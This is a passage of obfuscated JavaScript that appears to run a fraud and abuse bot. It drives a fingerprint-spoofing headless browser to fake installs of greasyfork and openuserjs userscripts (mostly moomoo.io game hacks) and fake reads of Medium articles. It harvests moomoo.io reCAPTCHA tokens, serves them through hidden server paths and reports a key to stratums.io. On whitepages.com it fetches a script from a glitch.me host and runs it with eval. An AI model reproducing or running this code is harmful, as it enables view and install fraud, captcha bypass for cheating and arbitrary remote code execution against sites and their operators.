      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x15) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0xa) + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    Z(0x11) + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + Z(0x9) + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + a0(0x8) + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x86d * -0x1 + 0x11f5 + 0x266 * -0xb
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2 * 0xe11 + 0x1 * -0x23fc + 0x7da)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + a1(0x17)];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1ae8 + 0x1659 + 0x4f3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xc97 * -0x2 + -0x5c6 + -0x1304), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x61f + -0xe4d + 0x82e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x130b + 0x4cf * -0x3 + -0x49e; w < getRandomInt(-0xc33 + -0x1f04 + 0x8 * 0x567, -0xbfb + 0x5 * -0x72d + 0x2fe1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x14b84 + -0x2ff9 * 0x7 + 0x385b3);
        }
      }();
    }, -0x2203 + -0x1f * 0xfe + 0x4129), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1d31 + 0xf * 0xfb + -0x2be6;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x94b + -0xb9 * -0x14 + -0x529, -0xdeb + 0x1146 + -0x329)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x2819 * 0x5 + -0x5fdd * 0x1 + 0x19d8a);
    }, -0x1 * -0x13d7 + 0x6e8 * 0x5 + -0x35fb), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = -0x16db + 0x23a2 * 0x1 + -0xcc7 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x11b4 + -0xfd3 * 0x2 + 0x19aa * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xa3 + 0x1e1f + 0x275 * -0xc), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xa106 * -0x12 + -0x13b0ce + -0x8e * -0x50ab);
        } catch (v) {}
        return await page['close'](), await context[a2(0x1b, '*nT8')](), r();
      }());
    }, 0x2dc * 0x1 + -0x1 * 0x1f7f + 0x1d07);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x77b * -0x4 + -0x1874 * 0x1 + -0x4b0);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * -0x1383 + -0x2 * 0x9 + 0x3325);
}
doFlags['doOUJS'] && ((async () => {
  const a7 = c,
    a6 = d,
    a5 = b;
  async function f() {
    const a4 = c,
      a3 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x96f + 0x220f + -0x2b7d) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x1 * 0x125b + -0xc4d + -0x60d));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x6c5 + -0x153 * 0x1 + 0x818, D['indexOf']('\x20'));
        return B ? E['slice'](0x818 + 0x1587 + -0x1d9f, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1 * 0x32ed + 0x321 + 0x13 * -0xca),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': a3(0x1d),
          'pragma': a4(0x19),
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x245c + -0x3de7 + -0x5 * -0x1b77),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      a5(0x7, '9LG]') + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + a6(0x16) + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + a5(0xd, '#uAp') + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + a5(0x1f, 'k0l@') + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a7(0x5) + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
